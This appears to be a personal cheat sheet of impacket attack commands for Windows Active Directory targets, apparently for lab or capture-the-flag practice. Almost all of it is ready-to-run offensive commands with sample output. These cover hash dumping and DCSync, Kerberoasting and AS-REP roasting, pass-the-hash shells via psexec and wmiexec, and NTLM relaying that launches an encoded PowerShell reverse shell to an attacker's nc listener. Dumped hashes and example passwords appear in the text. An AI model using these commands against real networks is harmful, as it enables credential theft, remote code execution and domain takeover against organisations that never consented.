# impacket
- <https://github.com/fortra/impacket>

Impacket is a collection of Python classes for working with network protocols.

Focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.








```bash
impacket-smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] # we connect to the server rather than a share

impacket-lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] # User enumeration on target

impacket-services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] # service enumeration


impacket-secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  # Dumping hashes on target



impacket-GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  # Kerberoasting, and request option dumps TGS
impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request



impacket-GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list







##RCE
impacket-psexec.py test.local/john:password123@10.10.10.1
impacket-psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
impacket-wmiexec.py test.local/john:password123@10.10.10.1
impacket-wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
impacket-smbexec.py test.local/john:password123@10.10.10.1
impacket-smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
impacket-atexec.py test.local/john:password123@10.10.10.1 <command>
impacket-atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>

```
























## PtH

```
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b 
Administrator@192.168.50.212


C:\Windows\system32> whoami
nt authority\system
```

```
impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212


C:\>whoami
files02\administrator
```


We can also use one of the other impacket scripts like `wmiexec.py` to obtain a shell 
as the user we used for authentication. On Kali, we would use `impacket-wmiexec` 
along with the arguments we used for `impacket-psexec`.

## wmiexec
```
impacket-wmiexec localadmin@10.10.11.14 -hashes "aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae"


# Impacket's wmiexec.py can be used to get a shell
impacket-wmiexec [DOMAIN]/[USERNAME]:[PASSWORD]@[IP]
impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.129.208.12
```







## Relaying Net-NTLMv2

```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc [ENCODED REVERSER POWERSHELL]
```


And on the ATTACKER MACHINE start a `nc` listener on the port the reverse shell is pointing at.










##  SPN
SPNs that are running under a user account:

```
impacket-GetUserSPNs enterprise.com/[username]:'[password]' -dc-ip [IP] -request ???

impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request

GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
```








## AS-REP Roasting

```
# Just list users with "Do not require Kerberos preauthentication" enabled

impacket-GetNPUsers [DOMAIN/[USERNAME (opt):PASSWORD (opt)]] -dc-ip [DOMAIN CONTROLLER IP]

impacket-GetNPUsers -dc-ip [DOMAIN CONTROLLER IP] corp.com/pete



# get the hash
impacket-GetNPUsers -dc-ip [DOMAIN CONTROLLER IP] -request -outputfile [OUTPUT FILE NAME] corp.com/pete
```

This will show the user account option "Do not require Kerberos preauthentication" enabled, meaning it's vulnerable to AS-REP Roasting.





## Kerberoasting

Use `impacket-GetUserSPNs` with the IP of the domain controller as the argument for `-dc-ip`.

Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash.

As before, we can use `-request` to obtain the TGS and output them in a compatible format for Hashcat.


```
sudo impacket-GetUserSPNs htb.local/asmith:passw0rd
sudo impacket-GetUserSPNs htb.local/asmith:passw0rd -request

sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

NOTE: if `impacket-GetUserSPNs` throws the error "KRB_AP_ERR_SKEW(Clock skew too great)" we need to synchronize the time of the Kali machine with the domain controller with `ntpdate` or `rdate`.





## dcsync

impacket-secretsdump on our non-domain joined Kali machine

```
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.166.70


# Output
...
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
# This is the hash: 08d7a47a6f9f66b97b1bae4178747494
...
```












## MSSQL
```
impacket-mssqlclient ARCHETYPE/sql_svc@${ip} -windows-auth

python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
```




## PSExec
```
impacket-psexec administrator@${ip}
python3 psexec.py administrator@{TARGET_IP}
```







## add computer
```
impacket-addcomputer '[DOMAIN]/[USERNAME]' -method [METHOD] -computer-name '[NEW COMPUTER_NAME]' -computer-pass '[NEW COMPUTER_PASSWORD]' -dc-ip [DC_IP_ADDRESS]


impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'EVIL01' -computer-pass 'Str0ng3st_P@ssw0rd!' -dc-ip 10.10.11.222

```
















